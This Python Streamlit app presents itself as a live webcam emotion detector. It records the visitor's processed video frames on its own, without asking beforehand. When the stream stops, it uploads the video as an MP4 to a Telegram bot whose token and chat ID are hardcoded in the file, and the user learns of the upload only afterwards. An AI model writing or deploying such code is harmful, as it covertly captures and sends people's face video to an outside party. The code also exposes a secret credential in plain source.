import av
import streamlit as st
import cv2
import datetime
import requests
from streamlit_webrtc import webrtc_streamer, WebRtcMode
from utils import process_frame

st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")

st.title("🎭 Live Emotion Detection")

BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
CHAT_ID = "5317875689"

if "frames" not in st.session_state:
    st.session_state.frames = []

if "recording" not in st.session_state:
    st.session_state.recording = False


def send_video_to_telegram(video_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"

    with open(video_path, "rb") as video:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"video": video})


def video_frame_callback(frame: av.VideoFrame) -> av.VideoFrame:

    img = frame.to_ndarray(format="bgr24")

    processed = process_frame(img)

    if st.session_state.recording:
        st.session_state.frames.append(processed)

    return av.VideoFrame.from_ndarray(processed, format="bgr24")


ctx = webrtc_streamer(
    key="emotion-detection",
    mode=WebRtcMode.SENDRECV,
    video_frame_callback=video_frame_callback,
    media_stream_constraints={"video": True, "audio": False},
    async_processing=True
)


# Start recording
if ctx.state.playing:
    st.session_state.recording = True


# When user presses STOP
if not ctx.state.playing and st.session_state.recording:

    st.session_state.recording = False

    frames = st.session_state.frames

    if len(frames) > 10:

        filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") + ".mp4"

        height, width, _ = frames[0].shape

        out = cv2.VideoWriter(
            filename,
            cv2.VideoWriter_fourcc(*'mp4v'),
            20,
            (width, height)
        )

        for frame in frames:
            out.write(frame)

        out.release()

        send_video_to_telegram(filename)

        st.success("Video sent to Telegram")

    st.session_state.frames = []